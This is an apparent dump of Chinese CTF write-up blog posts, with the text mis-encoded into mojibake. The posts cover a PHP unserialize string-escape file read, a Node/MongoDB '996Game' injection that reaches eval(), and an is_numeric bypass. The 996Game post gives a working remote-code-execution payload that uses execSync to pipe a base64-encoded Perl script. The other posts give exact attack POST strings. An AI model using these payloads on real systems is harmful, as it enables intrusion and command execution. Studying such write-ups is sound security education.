å¥½äº†ï¼Œå»æ‰¾ä¸€ä¸ªåºåˆ—åŒ–çš„ç±»å§ã€‚ç„¶åå‘ç°ï¼Œä¼¼ä¹æ²¡æœ‰ï¼Œd0g3_f1ag.phpæ²¡æ³•è¯»ï¼Œé‚£ä¸ªshow_imageæ˜¯ä¸ªæ‘†è®¾ï¼Œåªèƒ½è¯»guest_img.pngã€‚ç„¶åæˆ‘ä»¬å‘ç°ä¸ªé—®é¢˜ï¼Œä¸ºä»€ä¹ˆè¦å¤šæ­¤ä¸€ä¸¾çš„æ¥ä¸€è¡Œ$_SESSION['function']=$function;ï¼Œè€Œä¸”åé¢å®Œå…¨æ²¡ç”¨åˆ°ï¼Ÿ\\(functionæ˜¯GETä¼ å‚è€Œæ¥çš„ï¼Œæˆ‘ä»¬å¦‚ä½•è¦†ç›–\\)_SESSIONéƒ½ä¸ä¼šå½±å“æ¥ä¸‹æ¥çš„æµç¨‹ã€‚åªèƒ½è¯´æ˜$_SESSION[function]æœ‰é—®é¢˜ã€‚æˆ‘ä»¬æœ¬åœ°æµ‹è¯•ä¸€ä¸‹ã€‚ æ˜æ˜¾çš„çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„_SESSION[function]åŸå°ä¸åŠ¨çš„æ³¨å…¥åˆ°åºåˆ—åŒ–çš„ç»“æœäº†ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä»»æ„ä¿®æ”¹serializeçš„ç»“æœäº†ã€‚ å›åˆ°é¢˜ç›®ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä»€ä¹ˆï¼Ÿé€šè¿‡file_get_contents()å»è¯»å…¶ä»–æ–‡ä»¶ã€‚\\(userinfo[&#39;img&#39;]ç”±unserialize() filterè¿‡çš„SESSIONæ•°ç»„æ¥çš„ï¼Œè€Œæˆ‘ä»¬å¯æ§è¿™ä¸ªåºåˆ—åŒ–çš„ç»“æœï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦è®©\\)userinfo['img']å˜æˆå…¶ä»–çš„å†…å®¹ï¼Œç›®å‰æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ZDBnM19mMWFnLnBocA==ï¼ˆd0g3_f1ag.phpï¼‰ã€‚ æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ä¸Šé¢é‚£å¼ å›¾ï¼Œå½“_SESSION[function]èµ‹å€¼æˆ123456789æ—¶åºåˆ—åŒ–ï¼ˆæœªf=è¿‡æ»¤ï¼‰çš„ç»“æœæ˜¯a:2:&#123;s:8:\"function\";s:9:\"123456789\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;ï¼Œç„¶åæˆ‘ä»¬åœ¨123456789åé¢åŠ ä¸ªåŒå¼•å·è¯•å›¾æˆªæ–­ï¼Œç»“æœå˜æˆäº†ï¼ša:2:&#123;s:8:\"function\";s:11:\"123456789\"\u001d\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;ï¼Œä¸­é—´é‚£ä¸ªå¥‡æ€ªçš„ç¬¦å·å«åˆ†ç»„ç¬¦(0x1d)ã€‚å› æ­¤ï¼ŒåŠ ä¸ŠåŒå¼•å·æ˜¯æ²¡æ³•æˆªæ–­åºåˆ—çš„ã€‚é‚£å’‹åŠï¼Ÿ ç„¶åæˆ‘ä»¬æ³¨æ„åˆ°ä¸¤ä¸ªä¸ªé—®é¢˜ï¼Œä¸€æ˜¯$_SESSION['user']è¢«èµ‹å€¼æˆgueståå°±å†ä¹Ÿæ²¡å®ƒäº‹äº†ï¼ŒäºŒæ˜¯filter()å‡½æ•°è°ƒç”¨ï¼Œæ˜¯ç›´æ¥å¯¹åºåˆ—åŒ–çš„ç»“æœfilterï¼Œè¿™å°±æœ‰å¯èƒ½é€ æˆåºåˆ—åŒ–çš„ç»“æœå®Œå…¨æ”¹å˜ã€‚ çœ‹èµ·æ¥ä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬åŠ å…¥è¢«è¿‡æ»¤çš„è¯å‘¢ï¼Ÿ ç„¶åæŠ¥é”™äº†ï¼Œæˆ‘ä»¬æ¥è§‚å¯Ÿä¸€ä¸‹filterè¿‡åçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ša:3:&#123;s:4:\"user\";s:4:\"\";s:8:\"function\";s:7:\"123456\"\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;ï¼ˆBase64å€¼ä¸ºYTozOntzOjQ6InVzZXIiO3M6NDoiIjtzOjg6ImZ1bmN0aW9uIjtzOjc6IjEyMzQ1NiIiO3M6MzoiaW1nIjtzOjIwOiJaM1ZsYzNSZmFXMW5MbkJ1Wnc9PSI7fQ==ï¼‰ï¼Œuserå­—æ®µçš„å€¼ä¸ºï¼š\";s:8:\"function\";s:7:\"123456\"ï¼ŒPHPåºåˆ—åŒ–ä¸€å®šä¼šä»¥åŒå¼•å·ä½œä¸ºå¼€å§‹ç»“æŸçš„æ ‡å¿—ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å®é™…ä¸Šæ˜¯é€ƒé€¸äº†ä¸€ä¸ªåŒå¼•å·å‡ºæ¥ã€‚ æ‰€ä»¥ï¼Œå›åˆ°é¢˜ç›®ï¼Œæˆ‘ä»¬æœ€ç»ˆç›®æ ‡æ˜¯è¦æ„é€ å‡ºåƒa:2:&#123;s:4:\"user\";s:12:\"flagflagflag\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;è¿™æ ·çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼ˆæ ¸å¿ƒæ˜¯imgå­—æ®µå†…å®¹ï¼‰ï¼Œä½†æ˜¯æäº¤çš„æ—¶å€™è¦é€šè¿‡_SESSION[function]å’Œ_SESSION[user]æ„é€ å‡ºæ¥è¿™ä¸ªå­—ç¬¦ä¸²ï¼ˆç›´æ¥æäº¤_SESSION[img]æ²¡ç”¨ï¼Œå› ä¸ºä¼šé‡æ–°è¦†ç›–æˆguest_img.phpï¼‰ã€‚ æˆ‘ä»¬æ‰‹åŠ¨æ„é€ ä¸€ä¸‹ï¼šé¦–å…ˆfunctionä¸userä¸€å®šä¼šå‡ºç°è€Œimgæ˜¯æˆ‘ä»¬è¦çš„ï¼Œé‚£ä¹ˆæŠŠå¯¹è±¡æ•°å˜æˆ3å­—ç¬¦ä¸²å˜æˆï¼ša:3:&#123;s:4:\"user\";s:12:\"flagflagflag\";s:8:\"function\";s:6:\"123456\";&#125;ï¼Œæˆ‘ä»¬è‡ªå§‹è‡³ç»ˆå¯æ§çš„åªæœ‰123456è¿™ä¸ªéƒ¨åˆ†ã€‚flagä¼šè¢«è¿‡æ»¤æ‰ï¼Œå˜æˆï¼ša:3:&#123;s:4:\"user\";s:12:\"\";s:8:\"function\";s:6:\"123456\";&#125;ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¼šå¤šå‡ºæ¥ä¸€ä¸ªå•å¼•å·ï¼Œæˆ‘ä»¬åœ¨123456åé¢æ·»åŠ \";ï¼Œå­—ç¬¦ä¸²ä¼šå˜æˆï¼ša:3:&#123;s:4:\"user\";s:12:\"\";s:8:\"function\";s:6:\"123456\";\";&#125;ï¼Œuserå­—æ®µçš„å€¼å˜æˆ\";s:8:\"function\";s:6:\"123456ï¼Œæˆ‘ä»¬åœ¨åé¢æ’å…¥è‡ªå®šä¹‰çš„imgå­—æ®µä¿¡æ¯ï¼Œå˜æˆï¼ša:3:&#123;s:4:\"user\";s:12:\"\";s:8:\"function\";s:6:\"123456\";s:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"\";&#125;ï¼Œç„¶åä¿®æ­£ä¸€ä¸‹userå’Œfunctionçš„é•¿åº¦ï¼Œå˜æˆï¼ša:3:&#123;s:4:\"user\";s:29:\"\";s:8:\"function\";s:43:\"123456\";sï¼š3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"\";&#125;ï¼Œç»“æŸäº†ä¹ˆï¼Ÿå¹¶æ²¡æœ‰ã€‚æˆ‘ä»¬å›è¿‡å¤´çœ‹æœ¬æ–‡ç¬¬ä¸€å¼ å›¾ï¼Œåœ¨functionåé¢ï¼Œå®ƒä¼šè‡ªåŠ¨æ·»åŠ ä¸Šs:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\"ï¼Œæˆ‘ä»¬è¦æŠŠå®ƒå±è”½æ‰ï¼Œå¦åˆ™å¯¹è±¡æ•°ä¸å¯¹ï¼Œå¾ˆç®€å•ï¼ŒåŠ ä¸ª;&#125;å¼ºåˆ¶ç»“æŸæ‰åºåˆ—åŒ–å­—ç¬¦ä¸²å°±è¡Œäº†ï¼Œè¿™æ ·åé¢å°±ä¼šå½“åšåƒåœ¾ä¸å½±å“ç»“æœäº†ã€‚æœ€ç»ˆåºåˆ—åŒ–å­—ç¬¦ä¸²é•¿è¿™ä¸ªæ ·å­ï¼ša:3:&#123;s:4:\"user\";s:29:\"\";s:8:\"function\";s:45:\"123456\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";&#125;ï¼Œç„¶åæœ‰ç‚¹å°é—®é¢˜ï¼Œuseråœ¨è¿™é‡Œæ˜¯ç½®ç©ºçš„ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦è®©å…¶è¿‡æ»¤æˆç©ºï¼Œæ‰€ä»¥è¿˜è¦å°å°è°ƒæ•´ä¸€ä¸‹ï¼ša:3:&#123;s:4:\"user\";s:27:\"\";s:8:\"function\";s:43:\"1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";&#125;ã€‚æ‰€ä»¥æˆ‘ä»¬POST _SESSION[user]=phpphpphpphpphpphpphpphpphp&amp;_SESSION[function]=1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;ï¼Œç„¶åæœ¬åœ°è¿˜æ˜¯æ²¡æ‰“é€šï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿçœ‹ä¸€ä¸‹ç»“æœï¼ša:3:&#123;s:4:\"user\";s:27:\"\";s:8:\"function\";s:45:\"1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";&#125;\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";&#125;ï¼Œç°åœ¨çš„ååºåˆ—åŒ–ç»“æœå­˜åœ¨userå­—æ®µï¼Œå†…å®¹ä¸º\";s:8:\"function\";s:45:\"1234ç„¶åå°±æ˜¯imgå­—æ®µäº†ï¼Œæˆ‘ä»¬å¼ºè¡Œæ³¨å…¥ç»“æœå¹²æ‰äº†functionå­—æ®µï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦è¡¥ä¸Šå¦ä¸€ä¸ªå­—æ®µã€‚æ‰€ä»¥æœ€åæˆ‘ä»¬æäº¤ï¼š_SESSION[user]=phpphpphpphpphpphpphpphpphp&amp;_SESSION[function]=1234\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:1:\"1\";s:1:\"1\";&#125;ï¼Œæœ¬åœ°å¯ä»¥æ‰“é€šäº†ã€‚ æ”¾åˆ°BUUOJä¸Šå¼€é¢˜ã€‚ é‚£å°±æ¢æ–‡ä»¶è¯»å‘—ã€‚ Doneã€‚ flag{79424a28-5fda-49ec-8c16-636f2e761f1a}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"}]},{"title":"BUUOJåˆ·é¢˜-Web-996Game","slug":"BUUOJåˆ·é¢˜-Web-996Game","date":"2019-12-01T11:13:06.000Z","updated":"2019-12-10T12:15:12.586Z","comments":true,"path":"2019/12/01/BUUOJåˆ·é¢˜-Web-996Game/","link":"","permalink":"http://tiaonmmn.github.io/2019/12/01/BUUOJ%E5%88%B7%E9%A2%98-Web-996Game/","excerpt":"*CTF 2019çš„996Gameã€‚ç»™äº†ä¸ªHint:db.a.find(&#123;\"b\":&#123;\"$gt\":1,\"c\":\"d\"&#125;&#125;)ã€‚ ä¸Šæ¥å°±æ»¡æ»¡çš„é¡µæ¸¸ç”»é£ï¼Œç›®æµ‹æ˜¯æŸå¼€æºç½‘é¡µæ¸¸æˆæ”¹çš„é¢˜ï¼Œæœç„¶ï¼Œç¿»ä¸€ä¸‹æºç ï¼Œæç¤ºæˆ‘ä»¬å»æ‰¾https://github.com/Jerenaux/phaserquestã€‚å‘ç°æ˜¯ä¸ªNodeJSé¡¹ç›®ï¼ŒæŠŠæºç è„±ä¸‹æ¥çœ‹çœ‹ã€‚å‘ç°ç›´æ¥å°†jsç›®å½•æš´éœ²å‡ºæ¥äº†ã€‚","text":"*CTF 2019çš„996Gameã€‚ç»™äº†ä¸ªHint:db.a.find(&#123;\"b\":&#123;\"$gt\":1,\"c\":\"d\"&#125;&#125;)ã€‚ ä¸Šæ¥å°±æ»¡æ»¡çš„é¡µæ¸¸ç”»é£ï¼Œç›®æµ‹æ˜¯æŸå¼€æºç½‘é¡µæ¸¸æˆæ”¹çš„é¢˜ï¼Œæœç„¶ï¼Œç¿»ä¸€ä¸‹æºç ï¼Œæç¤ºæˆ‘ä»¬å»æ‰¾https://github.com/Jerenaux/phaserquestã€‚å‘ç°æ˜¯ä¸ªNodeJSé¡¹ç›®ï¼ŒæŠŠæºç è„±ä¸‹æ¥çœ‹çœ‹ã€‚å‘ç°ç›´æ¥å°†jsç›®å½•æš´éœ²å‡ºæ¥äº†ã€‚ 123app.use(&#x27;/css&#x27;,express.static(__dirname + &#x27;/css&#x27;));app.use(&#x27;/js&#x27;,express.static(__dirname + &#x27;/js&#x27;));app.use(&#x27;/assets&#x27;,express.static(__dirname + &#x27;/assets&#x27;)); js/serverå³ä¸ºæœåŠ¡ç«¯çš„ä»£ç ï¼Œåˆç†çŒœæµ‹å‡ºé¢˜äººä¿®æ”¹äº†è¿™é‡Œã€‚æˆ‘ä»¬æŠŠæœåŠ¡å™¨ä¸Šçš„æºç è„±ä¸‹æ¥è¿›è¡Œæ¯”å¯¹ã€‚ å¤šäº†ä¸ªeval()ï¼Œäº‹æƒ…å°±æœ‰ç‚¹å¤§äº†ã€‚ GameServer.serveræ¥æºäºserver.jsä¸­çš„å£°æ˜ï¼Œvar server=require('http').Server(app);å’Œgs.server=server;ã€‚è€Œdbæ¥è‡ªmongodbã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦è®©findOneæ“ä½œå¤±è´¥ï¼Œå¹¶ä¸”æ§åˆ¶è¿”å›ä¿¡æ¯ã€‚æˆ‘ä»¬å¯æ§çš„æ˜¯ä»€ä¹ˆï¼ŸloadPlayerå‡½æ•°å‚æ•°ä¸€ä¸ªæ˜¯socketï¼Œä¸€ä¸ªæ˜¯idã€‚åœ¨server.jsä¸­loadPlayerå‡½æ•°åœ¨io.on()å‡½æ•°æ‰§è¡Œæ—¶è¢«è°ƒç”¨ï¼Œç”¨çš„æ˜¯socket.ioåº“ï¼Œé‡‡ç”¨WebSocketåè®®è¿›è¡Œé€šè®¯ï¼Œé‚£ä¹ˆidåº”è¯¥å¯æ§ã€‚ æˆ‘ä»¬å…·ä½“è·Ÿä¸€ä¸‹ä»£ç ï¼Œåœ¨clientä¸‹çš„client.jsä¸­å‘ç°ï¼Œå®¢æˆ·ç«¯ä¼šå°†ç›¸å…³å‚æ•°ä¿å­˜åˆ°æµè§ˆå™¨çš„localStorageé‡Œã€‚ 123Client.socket.on(&#x27;pid&#x27;,function(playerID)&#123; // the &#x27;pid&#x27; event is used for the server to tell the client what is the ID of the player Client.setLocalData(playerID);&#125;); é‚£ä¹ˆæˆ‘ä»¬æ‰‹åŠ¨ä¿®æ”¹playerIDä¼šæ€æ ·ï¼ŸFirefoxä¿®æ”¹localStorageé‡Œçš„playerIDåé‡åˆ·æ–°é¡µé¢ï¼ŒPlayåå‘ç°æ¸¸æˆæ­»åœ¨äº†Creating Worldé˜¶æ®µï¼Œè‚¯å®šæ˜¯æŠ¥é”™äº†ï¼Œä½†æ˜¯æŠ¥é”™ç‚¹åœ¨å“ªé‡Œï¼Ÿè¿™ä¸ªå…‰çœ‹æºç æ˜¯ä¸å¤Ÿçš„äº†ï¼ŒåŸrepoç»™å‡ºäº†Dockerfileï¼Œæˆ‘ä»¬æ­èµ·æ¥ç¯å¢ƒçœ‹çœ‹ã€‚ æ³¨æ„æŠ¥é”™ç‚¹æ˜¯åœ¨bson/lib/objectid.jsé‡Œçš„new ObjectID()é‡Œã€‚è¦æ±‚æˆ‘ä»¬çš„playerIDæ˜¯24ä½å­—ç¬¦ï¼Œéšä¾¿ä¿®æ”¹ä¸€ä¸ªåˆæ³•çš„playerIDè¿›å…¥æ¸¸æˆã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹objectid.jsé‡Œé¢æœ‰ä»€ä¹ˆå†…å®¹ã€‚æ¶‰åŠåˆ°çš„new ObjectIDä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243var ObjectID = function ObjectID(id) &#123; // Duck-typing to support ObjectId from different npm packages if (id instanceof ObjectID) return id; if (!(this instanceof ObjectID)) return new ObjectID(id); this._bsontype = &#x27;ObjectID&#x27;; // The most common usecase (blank id, new objectId instance) if (id == null || typeof id === &#x27;number&#x27;) &#123; // Generate a new id this.id = this.generate(id); // If we are caching the hex string if (ObjectID.cacheHexString) this.__id = this.toString(&#x27;hex&#x27;); // Return the object return; &#125; // Check if the passed in id is valid var valid = ObjectID.isValid(id); // Throw an error if it&#x27;s not a valid setup if (!valid &amp;&amp; id != null) &#123; throw new Error( &#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27; ); &#125; else if (valid &amp;&amp; typeof id === &#x27;string&#x27; &amp;&amp; id.length === 24 &amp;&amp; hasBufferType) &#123; return new ObjectID(new Buffer(id, &#x27;hex&#x27;)); &#125; else if (valid &amp;&amp; typeof id === &#x27;string&#x27; &amp;&amp; id.length === 24) &#123; return ObjectID.createFromHexString(id); &#125; else if (id != null &amp;&amp; id.length === 12) &#123; // assume 12 byte string this.id = id; &#125; else if (id != null &amp;&amp; id.toHexString) &#123; // Duck-typing to support ObjectId from different npm packages return id; &#125; else &#123; throw new Error( &#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27; ); &#125; if (ObjectID.cacheHexString) this.__id = this.toString(&#x27;hex&#x27;);&#125;; æˆ‘ä»¬çš„æŠ¥é”™æ˜¯å› ä¸ºæ²¡æœ‰é€šè¿‡isValid()çš„æ£€æŸ¥ï¼ŒisValid()ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526ObjectID.isValid = function isValid(id) &#123; if (id == null) return false; if (typeof id === &#x27;number&#x27;) &#123; return true; &#125; if (typeof id === &#x27;string&#x27;) &#123; return id.length === 12 || (id.length === 24 &amp;&amp; checkForHexRegExp.test(id)); &#125; if (id instanceof ObjectID) &#123; return true; &#125; if (id instanceof _Buffer) &#123; return true; &#125; // Duck-Typing detection of ObjectId like objects if (id.toHexString) &#123; return id.id.length === 12 || (id.id.length === 24 &amp;&amp; checkForHexRegExp.test(id.id)); &#125; return false;&#125;; ç”¨çš„typeofï¼Œå¦‚æœæ˜¯Stirngï¼Œåˆ¤æ–­id.lengthæ˜¯å¦ç­‰äº12ã€‚JavaScriptæ˜¯ç§å¼±ç±»å‹è¯­è¨€ï¼ŒåŸæœ¬ä»£ç è®¤ä¸ºæäº¤çš„idæ˜¯Stringå¯¹è±¡è€Œç›´æ¥ç”¨lengthå±æ€§è·å¾—é•¿åº¦ï¼Œå¦‚æœæˆ‘ä»¬æ„é€ ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å«length==12çš„å±æ€§å‘¢ï¼ŸPayloadä¸ºid=&#123;\"id\":&#123;\"length\":12&#125;&#125;ã€‚è¿™æ ·å°±ç»•è¿‡isValid()çš„æ£€æŸ¥äº†ï¼Œå›åˆ°ObjectIDæ„é€ å‡½æ•°ï¼Œç„¶åå®ƒä¼šæ£€æŸ¥idæœ¬èº«æ˜¯ä»€ä¹ˆç±»å‹ï¼Œç›®å‰æˆ‘ä»¬çš„idå·²ç»æ˜¯Objectäº†ï¼Œçœ‹ä¸‹é¢ä¸¤ä¸ªelse ifï¼š 1234567891011121314else if (id != null &amp;&amp; id.length === 12) &#123; // assume 12 byte string this.id = id; &#125; else if (id != null &amp;&amp; id.toHexString) &#123; // Duck-typing to support ObjectId from different npm packages return id; &#125; else &#123; throw new Error( &#x27;Argument passed in must be a single String of 12 bytes or a string of 24 hex characters&#x27; ); &#125; if (ObjectID.cacheHexString) this.__id = this.toString(&#x27;hex&#x27;);&#125;; å¦‚æœid!=nullå¹¶ä¸”id.length===12åˆ™this.id=idï¼Œä½†æˆ‘ä»¬ä¸èƒ½èµ°è¿™ä¸ªåˆ¤æ–­ï¼Œå› ä¸ºæœ€åä¸€è¡Œä¼šæŠŠæˆ‘ä»¬çš„Payloadè½¬æˆHexã€‚é‚£ä¹ˆPayloadå˜ä¸ºid=&#123;\"length\":\"0\",\"id\":&#123;\"length\":12&#125;&#125;ï¼Œä¸‹ä¸€ä¸ªifè¦æ±‚id.toHexStringä¸ºçœŸï¼Œé‚£ä¹ˆPayloadå˜ä¸ºï¼šid=&#123;\"length\":\"0\",\"toHexString\":true,\"id\":&#123;\"length\":12&#125;&#125;ã€‚è¿™æ ·å°±å¯ä»¥ç»•è¿‡æ£€æµ‹äº†ã€‚ æˆ‘ä»¬å¯æ§idäº†ï¼Œä¸‹ä¸€æ­¥æ˜¯è¦æ§åˆ¶æŠ¥é”™ä¿¡æ¯ã€‚æˆ‘ä»¬çš„Hintç›®å‰è¿˜æ²¡ç”¨ä¸Šï¼Œåç«¯æ•°æ®åº“ç”¨çš„æ˜¯MongoDBã€‚åœ¨MongoDBé‡Œæ‰§è¡Œä¸€ä¸‹Hintè¯•è¯•ã€‚ 1234567MongoDB shell version: 2.6.10connecting to: test&gt; db.a.find(&#123;&quot;b&quot;:&#123;&quot;$gt&quot;:1,&quot;c&quot;:&quot;d&quot;&#125;&#125;)error: &#123; &quot;$err&quot; : &quot;Can&#39;t canonicalize query: BadValue unknown operator: c&quot;, &quot;code&quot; : 17287&#125; $gtåœ¨MongoDBæ˜¯&gt;çš„æ„æ€ï¼Œæ˜¯ä¸ªå†…ç½®è¿ç®—ç¬¦ã€‚å¦‚æœå†…ç½®è¿ç®—ç¬¦æ”¾åœ¨æœ€å‰é¢ï¼Œåé¢çš„å†…å®¹å°±ä¼šæŠ¥é”™ï¼Œkeyä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚ä¸‹é¢å°±æ˜¯ä¼ NodeJSçš„Payloadäº†ï¼Œç”¨require('child_process').execSyncå³å¯ã€‚ç„¶åæœ‰ä¸ªé—®é¢˜ï¼Œåˆæ¥/readflagç»•è¿‡ï¼Œç”¨Perlçš„IPC:Open3æ¥è¿›è¡Œç®¡é“äº¤äº’ï¼Œæœ€ç»ˆæ‹¿åˆ°flagã€‚ æœ€ç»ˆPayload:Client.getPlayerID = () => ({ \"$gt\":1,[`process.chdir('/');socket.emit('aaa');socket.emit(require('child_process').execSync('sh -c \\\"echo \\\\\\'dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoXCpDSExEX0lOLCBcKkNITERfT1VULCBcKkNITERfRVJSLCAnL3JlYWRmbGFnJykgb3IgZGllICJvcGVuMygpIGZhaWxlZCAkISI7CgpteSAkcjsKCiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokcj1ldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw==\\\\\\'|base64 -d | perl \\\"'));`]:\"bb\", toHexString: 'aaa', length: 0, id: {length: 12}}) ä¸ºäº†æ–¹ä¾¿Payloadè¾“å…¥ æˆ‘ä»¬ç”¨Base64ç¼–ç ç„¶åä¼ é€’Perlï¼Œæ²¡ç”¨bashçš„åŸå› æ˜¯bashå¹¶ä¸æ˜¯æ€»æ˜¯å­˜åœ¨çš„ï¼Œä½†æ˜¯shä¸€å®šæœ‰ï¼ˆè¯´çš„å°±æ˜¯ä½ ï¼ŒAlpine Linuxï¼‰ã€‚ æ”¾åœ¨æ§åˆ¶å°é‡Œæ‰§è¡Œï¼Œç„¶åç‚¹Playè§¦å‘ï¼Œå°±å¯ä»¥åœ¨Networkçš„WSé‡Œçœ‹åˆ°ç»“æœäº†ã€‚å¦‚å›¾æ‰€ç¤ºï¼š P.S. ç½‘ä¸Šçš„Payloadéƒ½æ²¡æ³¨æ„å¼•å·çš„è½¬ä¹‰å•Šï¼Œåœ¨æ§åˆ¶å°é‡Œè¾“å…¥Payloadçš„æ—¶å€™è¦è¿›è¡Œå•åŒå¼•å·è½¬ä¹‰ï¼Œä½†æ˜¯ä¼ é€’åˆ°NodeJSååŸæœ¬è½¬ä¹‰ç”¨çš„\\ä¼šè¢«å»æ‰ï¼Œå°±å˜æˆæ²¡è½¬ä¹‰çš„ï¼Œå®é™…ä¸Šè¦äºŒæ¬¡è½¬ä¹‰ã€‚ flag{ef5059f5-8ee6-4727-aca3-6bd720379070}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://tiaonmmn.github.io/tags/NodeJS/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Pipe","slug":"Pipe","permalink":"http://tiaonmmn.github.io/tags/Pipe/"}]},{"title":"BUUOJåˆ·é¢˜-Web-æå®¢å¤§æŒ‘æˆ˜2019-Buyflag","slug":"BUUOJåˆ·é¢˜-Web-æå®¢å¤§æŒ‘æˆ˜2019-Buyflag","date":"2019-11-25T12:29:01.000Z","updated":"2019-12-10T12:15:12.604Z","comments":true,"path":"2019/11/25/BUUOJåˆ·é¢˜-Web-æå®¢å¤§æŒ‘æˆ˜2019-Buyflag/","link":"","permalink":"http://tiaonmmn.github.io/2019/11/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Buyflag/","excerpt":"Sycloveræå®¢å¤§æŒ‘æˆ˜çš„ä¸€é“é¢˜ï¼ŒæŒºç®€å•çš„ã€‚ ä¸Šæ¥è®©æˆ‘ä»¬ä¹°Flagã€‚æŠ“ä¸€ä¸‹åŒ…ï¼Œå¾ˆæ˜æ˜¾çš„çœ‹åˆ°Cookieé‡Œæœ‰ä¸ªuser=0ï¼Œæˆ‘ä»¬ç›´æ¥æ”¹æˆ1ï¼Œç„¶åè¦passwordï¼Œé¡µé¢åé¢æœ‰ä¸€æ®µæ³¨é‡Šã€‚","text":"Sycloveræå®¢å¤§æŒ‘æˆ˜çš„ä¸€é“é¢˜ï¼ŒæŒºç®€å•çš„ã€‚ ä¸Šæ¥è®©æˆ‘ä»¬ä¹°Flagã€‚æŠ“ä¸€ä¸‹åŒ…ï¼Œå¾ˆæ˜æ˜¾çš„çœ‹åˆ°Cookieé‡Œæœ‰ä¸ªuser=0ï¼Œæˆ‘ä»¬ç›´æ¥æ”¹æˆ1ï¼Œç„¶åè¦passwordï¼Œé¡µé¢åé¢æœ‰ä¸€æ®µæ³¨é‡Šã€‚ 123456789 ~~~post money and password~~~if (isset($_POST[&#x27;password&#x27;])) &#123; $password = $_POST[&#x27;password&#x27;]; if (is_numeric($password)) &#123; echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;; &#125;elseif ($password == 404) &#123; echo &quot;Password Right!&lt;/br&gt;&quot;; &#125;&#125; is_numberic()ç»•è¿‡ï¼Œåœ¨æ•°å­—åé¢åŠ ä¸Šç‚¹å­—ç¬¦å°±å¯ä»¥äº†ï¼Œä¸€ä¸ªç©ºæ ¼OKã€‚æäº¤password=404%20ï¼Œåˆè¦æˆ‘ä»¬moneyã€‚æ³¨æ„åˆ°è¿™é¢˜Cookieæ²¡æœ‰ç”¨ä¸ŠPHPSESSIDï¼Œé‚£ä¹ˆè¿™é¢˜çŒœä¸€ä¸‹é€»è¾‘å°±æ˜¯ç›´æ¥å°†æˆ‘ä»¬æäº¤çš„moneyä¸è¦æ±‚çš„1000000æ¯”è¾ƒï¼Œä¸å­˜åœ¨è®°å½•çš„è¿‡ç¨‹ã€‚ åŒæ—¶æ³¨æ„åˆ°ï¼Œæ­¤é¢˜ç”¨åˆ°çš„æ˜¯PHP 5.3.5ï¼Œè€ç‰ˆæœ¬PHPäº†ã€‚è¦æ±‚æˆ‘ä»¬ä¸èƒ½è¾“å…¥8ä½å­—ç¬¦ï¼Œè€Œè¾“å…¥å…¶ä»–ä»»ä½•å­—ç¬¦éƒ½ä¼šè¿”å›you have not enough 